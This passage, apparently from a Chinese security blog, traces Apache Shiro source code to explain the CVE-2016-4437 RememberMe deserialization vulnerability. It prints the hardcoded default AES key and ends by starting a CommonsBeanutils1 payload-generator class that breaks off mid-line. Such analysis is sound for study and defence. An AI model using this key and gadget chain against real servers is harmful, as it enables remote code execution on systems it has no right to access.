log.trace(<span class="string">&quot;Filter &#x27;&#123;&#125;&#x27; not yet executed.  Executing now.&quot;</span>, getName());</span><br><span class="line">        request.setAttribute(alreadyFilteredAttributeName, Boolean.TRUE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            doFilterInternal(request, response, filterChain);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// Once the request has finished, we&#x27;re done and we don&#x27;t</span></span><br><span class="line">            <span class="comment">// need to mark as &#x27;already filtered&#x27; any more.</span></span><br><span class="line">            request.removeAttribute(alreadyFilteredAttributeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而doFilterInternal这个方法在子类AbstractShiroFilter中有被重写。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doFilterInternal</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, <span class="keyword">final</span> FilterChain chain)</span></span><br><span class="line">        <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">t</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> prepareServletRequest(servletRequest, servletResponse, chain);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> prepareServletResponse(request, servletResponse, chain);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> createSubject(request, response);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//noinspection unchecked</span></span><br><span class="line">        subject.execute(<span class="keyword">new</span> <span class="title class_">Callable</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                updateSessionLastAccessTime(request, response);</span><br><span class="line">                executeChain(request, response, chain);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ExecutionException ex) &#123;</span><br><span class="line">        t = ex.getCause();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">        t = throwable;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个方法中会调用createSubject方法创建Subject。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> WebSubject <span class="title function_">createSubject</span><span class="params">(ServletRequest request, ServletResponse response)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebSubject</span>.Builder(getSecurityManager(), request, response).buildWebSubject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟下去，最终会调用父类org.apache.shiro.mgt.DefaultSecurityManager中的createSubject(org.apache.shiro.subject.SubjectContext)方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Subject <span class="title function_">createSubject</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="comment">//create a copy so we don&#x27;t modify the argument&#x27;s backing map:</span></span><br><span class="line">    <span class="type">SubjectContext</span> <span class="variable">context</span> <span class="operator">=</span> copy(subjectContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ensure that the context has a SecurityManager instance, and if not, add one:</span></span><br><span class="line">    context = ensureSecurityManager(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Resolve an associated Session (usually based on a referenced session ID), and place it in the context before</span></span><br><span class="line">    <span class="comment">//sending to the SubjectFactory.  The SubjectFactory should not need to know how to acquire sessions as the</span></span><br><span class="line">    <span class="comment">//process is often environment specific - better to shield the SF from these details:</span></span><br><span class="line">    context = resolveSession(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Similarly, the SubjectFactory should not require any concept of RememberMe - translate that here first</span></span><br><span class="line">    <span class="comment">//if possible before handing off to the SubjectFactory:</span></span><br><span class="line">    context = resolvePrincipals(context);</span><br><span class="line"></span><br><span class="line">    <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> doCreateSubject(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//save this subject for future reference if necessary:</span></span><br><span class="line">    <span class="comment">//(this is needed here in case rememberMe principals were resolved and they need to be stored in the</span></span><br><span class="line">    <span class="comment">//session, so we don&#x27;t constantly rehydrate the rememberMe PrincipalCollection on every operation).</span></span><br><span class="line">    <span class="comment">//Added in 1.2:</span></span><br><span class="line">    save(subject);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> subject;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如上createSubject方法对resolvePrincipals方法进行了调用，在resolvePrincipals又调用了getRememberedIdentity。getRememberedIdentity中调用了getRememberMeManager和getRememberedPrincipals。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">getRememberedIdentity</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">RememberMeManager</span> <span class="variable">rmm</span> <span class="operator">=</span> getRememberMeManager();</span><br><span class="line">    <span class="keyword">if</span> (rmm != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> rmm.getRememberedPrincipals(subjectContext);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Delegate RememberMeManager instance of type [&quot;</span> + rmm.getClass().getName() +</span><br><span class="line">                        <span class="string">&quot;] threw an exception during getRememberedPrincipals().&quot;</span>;</span><br><span class="line">                log.warn(msg, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据getRememberMeManager方法的签名，可以得知该方法会返回一个org.apache.shiro.mgt.RememberMeManager对象，这是一个接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> RememberMeManager <span class="title function_">getRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> rememberMeManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RememberMeManager</span></span><br></pre></td></tr></table></figure><p>随后会调用到org.apache.shiro.mgt.RememberMeManager#getRememberedPrincipals，这个接口方法只有在AbstractRememberMeManager一个类中得到了实现，而处理RememberMe Cookie得类又是继承自AbstractRememberMeManager类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Base64解码"><a href="#Base64解码" class="headerlink" title="Base64解码"></a>Base64解码</h3><p>在如上AbstractRememberMeManager#getRememberedPrincipals方法中调用了getRememberedSerializedIdentity与convertBytesToPrincipals两个方法。</p><p>此处的getRememberedSerializedIdentity是一个抽象方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext);</span><br></pre></td></tr></table></figure><p>在shiro-web中，由于org.apache.shiro.web.mgt.CookieRememberMeManager继承自org.apache.shiro.mgt.AbstractRememberMeManager类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CookieRememberMeManager</span> <span class="keyword">extends</span> <span class="title class_">AbstractRememberMeManager</span></span><br></pre></td></tr></table></figure><p>所以最终会调用到CookieRememberMeManager中的getRememberedSerializedIdentity方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">            log.debug(msg);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext) subjectContext;</span><br><span class="line">    <span class="keyword">if</span> (isIdentityRemoved(wsc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> getCookie().readValue(request, response);</span><br><span class="line">    <span class="comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span></span><br><span class="line">    <span class="comment">// ignore cookies that are scheduled for removal</span></span><br><span class="line">    <span class="keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">        base64 = ensurePadding(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">        <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">            log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decoded;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//no cookie set - new site visitor?</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法会传入的RememberMe Cookie进行Base64编码，并返回byte[]数组。</p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/5.png"></p><h3 id="AES解密"><a href="#AES解密" class="headerlink" title="AES解密"></a>AES解密</h3><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/6.png"></p><p>紧接着，会对字节数组进行非空判断，若成立就会调用org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals方法，在其中解密又调用了两个关键方法，decrypt和deserialize，顾名思义，解密与反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>decrypt方法如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在里面调用了getDecryptionCipherKey方法获取解密Key，返回值便是Base64.decode(“kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] decryptionCipherKey;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">    <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCipherKey</span><span class="params">(<span class="type">byte</span>[] cipherKey)</span> &#123;</span><br><span class="line">    <span class="comment">//Since this method should only be used in symmetric ciphers</span></span><br><span class="line">    <span class="comment">//(where the enc and dec keys are the same), set it on both:</span></span><br><span class="line">    setEncryptionCipherKey(cipherKey);</span><br><span class="line">    setDecryptionCipherKey(cipherKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getDecryptionCipherKey() &#123;</span><br><span class="line">    <span class="keyword">return</span> decryptionCipherKey;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，将密文与Key传入至cipherService.decrypt中，这个方法是org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] encrypted = ciphertext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//No IV, check if we need to read the IV from the stream:</span></span><br><span class="line">    <span class="type">byte</span>[] iv = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isGenerateInitializationVectors(<span class="literal">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">ivSize</span> <span class="operator">=</span> getInitializationVectorSize();</span><br><span class="line">            <span class="type">int</span> <span class="variable">ivByteSize</span> <span class="operator">=</span> ivSize / BITS_PER_BYTE;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//now we know how large the iv is, so extract the iv bytes:</span></span><br><span class="line">            iv = <span class="keyword">new</span> <span class="title class_">byte</span>[ivByteSize];</span><br><span class="line">            System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//remaining data is the actual encrypted ciphertext.  Isolate it:</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">encryptedSize</span> <span class="operator">=</span> ciphertext.length - ivByteSize;</span><br><span class="line">            encrypted = <span class="keyword">new</span> <span class="title class_">byte</span>[encryptedSize];</span><br><span class="line">            System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to correctly extract the Initialization Vector or ciphertext.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CryptoException</span>(msg, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于AES是一种对称加密算法，加解密所用到的密钥Key会是同一个，还会涉及一个初始向量iv。所以在这个方法中，将encrypted、key、iv传给了JcaCipherService#decrypt(byte[], byte[], byte[])方法，在其中进行AES解密，最后返回解密后的内容。</p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/7.png"></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>成功解密后就会返回到convertBytesToPrincipals方法中，继续交由deserialize方法处理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serializedIdentity)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getSerializer().deserialize(serializedIdentity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后在org.apache.shiro.io.DefaultSerializer#deserialize方法中发生反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> deserialized;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面调用了原生readObject方法进行反序列化，这也是远程代码执行漏洞发生的地方。</p><p><img src="/img/post/cve-2016-4437-apache-shiro-rce/8.png"></p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>由于Shiro中是存在Commons BeanUtils组件的，但存在的Commons Collections组件是不完整的，所以可以直接利用CommonsBeanutils1来攻击Shiro。</p><p>关于CommonsBeanutils1链的详细分析见<a href="https://0xf4n9x.github.io/java-deserialization-cb1.html">《Java反序列化漏洞之CommonsBeanutils1链》</a>文章，这里直接使用如下利用代码生成恶意反序列化数据CBRCEWithoutCC.ser文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CBRCEWithoutCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span 